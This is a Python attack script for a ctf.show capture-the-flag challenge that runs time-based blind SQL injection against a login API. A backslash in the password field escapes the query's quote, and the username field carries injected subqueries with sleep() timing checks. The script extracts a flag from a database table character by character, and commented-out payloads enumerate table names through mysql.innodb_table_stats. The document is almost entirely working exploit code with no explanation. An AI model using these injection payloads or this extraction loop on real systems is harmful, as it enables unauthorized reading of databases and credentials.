# @Author:Kradress
import requests
import string

url = "http://99c6146f-7390-4303-9c69-8bad06dfd783.challenge.ctf.show/api/"
table_name = 'flag23a1'

result = ''


def strToHex(S: str):
    parts = []
    for s in S:
        parts.append(str(hex(ord(s)))[2:])
    return '0x' + ''.join(parts)


uuid = string.ascii_lowercase + string.digits + "{-,_}"
# 数据库名
# payload = "database()"
# 爆表名
# payload = "select group_concat(table_name) from mysql.innodb_table_stats where database_name=database()"


for i in range(1, 50):
    for j in range(32, 128):
        data = {
            # 爆表名
            # 'username' : f" where username =  0x63746673686f77 and if(ascii(substr(({payload}),{i},1))={j},sleep(3),1)#",
            # 比较法盲注
            'username': f" where username =  0x63746673686f77 and if(((select 0x31,{strToHex(result + chr(j))},{strToHex('!')})<(select * from {table_name} limit 0,1)),1,sleep(3))#",
            'password': "\\"
        }
        print(i, data.get('username'))

        try:
            r = requests.post(url, data=data, timeout=2.5)
        except:
            result += chr(j - 1)  # sleep导致超时
            print(result)
            break

        if (j == 127):
            break
